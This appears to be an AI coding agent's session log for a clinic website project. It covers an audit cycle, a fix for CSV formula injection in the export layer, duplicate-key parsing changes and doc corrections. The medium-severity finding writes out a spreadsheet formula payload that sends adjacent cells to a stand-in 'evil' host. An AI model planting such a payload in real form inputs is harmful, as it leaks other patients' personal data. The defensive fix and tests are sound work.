# Session 36 — CSV Formula-Injection Guard, Duplicate-Key First-Wins, 19th Audit Cycle, Parity Re-Verification

Continuation of `docs/session_34.md` / `docs/session_35.md`. Scope: refresh
workspace (fresh `git clone` → `8be66ac` — the workspace had been reset, so
the environment was re-bootstrapped from scratch) → review docs + session
logs (34 + remediation-plan-session34 + worklog + 35) → validate
understanding against the codebase → re-audit with live reference
verification → remediate the findings (headline: the first
Medium-severity finding in 19 audit cycles) → re-verify → document → push.
The repo `skills/` folder stayed excluded from checking, testing and
compilation throughout.

## What was audited

- Workspace refreshed via fresh git clone → `8be66ac` (= session-34's
  `6a5223c` + the docs-only operator transcript `docs/session_35.md`); the
  worktree was clean. Environment re-bootstrapped per the documented
  workflow: `bun install` (424 packages), `.env` created with GENERATED
  credentials (never printed — the session-22 F1 doctrine), `db:push` +
  `db:seed` + `SEED_DEMO=1` → exactly the 6 demo rows (2/2/2) + 1 admin
  in `<repo>/db/custom.db`. The ambient `DATABASE_URL` hijack
  (`file:/home/z/my-project/db/custom.db`) was ACTIVE all session — the
  ADR-010 `env -u` guards held (live-proven by every write landing in the
  repo DB; the orchestrator's own scratch verification script tripped on
  the hijack once and was force-overridden per the documented doctrine).
- Read AGENTS.md, CLAUDE.md, README.md, Project_Architecture_Document.md,
  health-care-clinic_SKILL.md (v2.8.8), docs/session_34.md,
  docs/remediation-plan-session34.md, worklog.md, docs/session_35.md —
  then validated the claims against the tree.
- Operator asks re-verified live: the vitest + playwright suites present
  and green (baseline: 152/152 + 61/61 × 2 — the double-run proof);
  `.env` `DATABASE_URL="file:../db/custom.db"` with `db/` at the repo
  root; `.env.example` ↔ codebase exact.
- Baseline gates before any change: lint 0 (14 rules ON) / tsc true-strict
  / 152/152 unit / build OK (the 14-route table) / 61/61 e2e × 2 — all
  green, exactly as documented.
- `skills/code-review-and-audit` pipeline (static gates) + a fresh-eyes
  full review dispatched as a read-only sub-agent (Task 36-a, 19th cycle)
  — every finding re-verified by the orchestrator before acceptance.
- `skills/agent-browser` live parity probes on BOTH the reference and the
  local clone (desktop 1440×900 + mobile 390×844) — viewport verified via
  `innerWidth`/`innerHeight` before every measurement, settle-waits
  before readings, canvas paint-isolation for the color proofs (the
  suite's own rasterization technique, matching
  `tests/e2e/mobile-navigation.spec.ts`).
- Scandihaven (tech-stack patterns repo) re-cloned and re-checked —
  unchanged at `d4789c3`; same substrate doctrine (Next 16 + React 19 +
  TS strict + Tailwind v4 CSS-first + Vitest/Playwright), nothing new to
  import this session.

## Key findings (full detail: docs/remediation-plan-session36.md)

The session-34 remediation held up — all gates green, every prior fix
re-probed with zero regressions. The 19th audit found the FIRST
Medium-severity finding in 19 cycles (5 findings: 1 Medium, 2 Low, 2
Info):

1. **F1 (Medium): CSV formula injection in the export layer.** `csvField`
   guarded only RFC 4180 characters — a public-form `fullName` like
   `=WEBSERVICE("http://evil/?leak="&B2)` (VALID: 3–120 chars, no charset
   rule; `EMAIL_PATTERN` likewise accepts `=a@b.cd`) exported RAW.
   Opening the attachment in Excel/LibreOffice/Sheets would evaluate the
   formula in the staff member's spreadsheet context and exfiltrate
   adjacent cells — other patients' PII — to the attacker's server
   (OWASP CSV-injection class). Missed by 18 prior cycles because the RFC
   4180 pins LOOKED complete.
2. **F2 (Low):** CLAUDE.md's six-phase VERIFY step said "53 tests" (the
   session-32 count; reality 61).
3. **F3 (Low):** PAD §3.2's tests tree was missing BOTH session-34 rows
   (`dashboard-filters.test.ts`, `e2e/dashboard-filters.spec.ts`) + a
   stale 53 total — the repo's recurring missed-sibling-row class.
4. **F4 (Info):** PAD §11 line estimates drifted on two ADR-012 rows
   (~470 vs 407 actual; ~165 vs 153).
5. **F5 (Info):** duplicate filter keys parsed FIRST-vs-LAST differently
   on the two ADR-012 surfaces (dashboard page: Next searchParams →
   firstValue = FIRST; export route: `Object.fromEntries` = LAST) — a
   hand-crafted `?status=new&status=completed` URL broke the "export
   matches the visible view" contract. Not producible by the native GET
   form.

## Live parity evidence (reference vs clone, same session, same method)

| Metric | Reference | Clone (before) | Clone (after) |
| ------ | --------- | ----- | ----- |
| Page height @1440×900 (viewport VERIFIED) | 7490px | 7490px | **7490px** |
| Mobile dropdown panel (390×844) | 192×148 @ (178,80), grid, r24, p8, `<nav>` | identical | **identical** |
| Mobile panel paint (canvas isolation) | [38,74,57,230] | [38,74,57,230] EXACT | **[38,74,57,230] EXACT** |
| Desktop nav pill paint (canvas isolation) | [37,74,57,204] | identical | **identical** |
| Mobile menu link click | closes + unmounts; scrollY 1837; services at viewport top | identical | **identical** |
| Mobile page height | 12164 | 12162 (documented 2px contact drift) | 12162 |
| Section content | 7/7 ids; 7 h2s byte-identical | identical | **identical** |
| Route table | `/`, `/privacy-policy`, `/accessibility-statement` | **superset** (+ /login, /dashboard 307-guarded, /robots.txt, /sitemap.xml) | unchanged |

**Mobile navigation verified working correctly on both sites — no
Tailwind v4 bug.** The full 12-step product loop stayed green (13/13
checks incl. the httpOnly cookie: anon 307 → login 200 → dashboard 200 →
POST 201 → PATCH confirm 200 → PATCH complete 200 → anon PATCH 401 →
unknown id 404 → invalid status 422 → wrong creds generic 401 → logout
200 → post-logout 307); probe rows purged after (exactly the 6 seed rows
remain); dev.log clean.

## What was remediated (TDD-first; docs/remediation-plan-session36.md)

- **Track A — the CSV formula-injection guard (F1):** 6 RED unit cases
  FIRST (each trigger char `= + - @` tab CR in isolation, the `+`-leading
  international phone, the compose-with-RFC-quoting form,
  ordinary-values-untouched, no-double-guarding) + the ONE existing
  exact-string pin deliberately updated (the `+1 555 010 0002` phone now
  exports as `'+1 555 010 0002` — the change IS the fix) → then the guard
  in `csvField` (`FORMULA_LEADING = /^[=+\-@\t\r]/` → apostrophe
  text-marker INSIDE the quotes): uniform across every exported column,
  ordinary values byte-identical, and `'+65 …` phones still DISPLAY
  verbatim in the big-three spreadsheet apps (the marker is hidden in
  display — the security win costs nothing visible). The e2e pin (public
  POST with a `=HYPERLINK` payload → export → the guarded+quoted field
  asserted) was **RED-proven** by temporarily reverting the guard and
  watching it fail (the session-26 F4 honesty pattern). A LIVE end-to-end
  probe verified the guard on the running dev server (public POST 201 →
  export contains the guarded field, zero unguarded field-starts → probe
  rows purged).
- **Track B — duplicate-key first-wins unification (F5):** 5 RED unit
  cases for the new seam export `urlSearchParamsToRecord` (collects EVERY
  occurrence per key in order; the first-wins round-trip pin
  `?status=new&status=completed` → `{status: "new"}`) → implemented in
  the seam; the export route switched from `Object.fromEntries` (last
  wins) to the seam conversion — BOTH surfaces now first-wins by
  construction, byte-identical to the dashboard page's Next-searchParams
  path. 1 e2e pin (duplicated status params: the dashboard table AND the
  export both filter by the first value — fixtures posted, one patched
  away, both surfaces asserted).
- **Track C — doc residuals:** CLAUDE VERIFY count 53 → 61 (F2); PAD
  §3.2 tests tree completed with both session-34 rows + the runtime
  total (F3 — swept with structural grep acceptance); PAD §11 re-measured
  (F4: dashboard/page.tsx ~410, dashboard-filters.ts ~185, the unit spec
  ~365, the e2e spec ~360, the export route ~98 — all post-remediation
  numbers).
- **Docs:** every living doc swept — README (Tested row 163/63 + the
  export API row's formula-guard note), AGENTS (e2e count + new rule 12:
  the guard doctrine + first-wins doctrine), CLAUDE (VERIFY 63 + unit 42
  + e2e spec pins + Success Metrics 163/63), SKILL.md → v2.8.9
  (frontmatter project_state + the sessions list + §11 gate counts +
  Appendix B [S36]), PAD (ADR-012's session-36 Consequences extension +
  [S36] revision block + §3.2 tree + §7.1/§7.3/§7.4 counts + §11 rows),
  this session record, and the repo worklog entry.
- **Hardening lessons pinned:** the mobile capture locator must scope to
  the aria-labelled `Mobile` navigation (`getByRole("navigation", {
  name: "Mobile" })`) — a bare `nav a` first() resolves to the
  hidden-at-390px DESKTOP nav link; and the post-success-state
  appointment form requires a real `page.reload()` (the hash-nav goto is
  a same-document navigation — the success panel stays mounted; the
  session-28 hash-nav remount doctrine).

## Verification gate (final, post-remediation)

lint 0 errors (14 correctness rules ON) · typecheck clean under true
strict · **163/163 unit** (152 → 163: +6 formula-guard, +5
urlSearchParamsToRecord) · production build OK (the 14-route page table
unchanged) · **63/63 e2e × 2 consecutive runs (the double-run proof)** ·
live re-verification on the remediated tree: page height 7490px
unchanged; mobile panel 192×148 @ (178,80) with canvas-isolated paint
[38,74,57,230] EXACT; pill [37,74,57,204]; link-click closes + unmounts
+ scrollY 1837 with services at viewport top; `/api/health` up; the
12-step product loop green (13/13) under the still-active ambient
`DATABASE_URL` hijack; the live formula-payload probe green · 20
screenshots refreshed from the remediated dev server (03-desktop-full
exactly 1440×7490 — the parity height; the dashboards show the query bar
+ exactly the 6 seed rows after the capture's submission rows were
purged) · dev.log clean (no hydration errors, no failed API calls, no
PII).

## Outcome

Committed on `main` and pushed via `docs/ssh_git_wrapper_v3.py` (runbook:
`docs/how-to-git-push-using-ssh-wrapper_SKILL.md`); the operator key was
shredded after the push and the remote ref verified equal to local HEAD.

**Suggested next steps** (recorded for a future session; the PAD §10
backlog carries no actionable code items): a paginated query layer if
volumes outgrow the latest-100 window; revisit JSON-LD structured data
if real clinic NAP data ever replaces the placeholder parity copy.
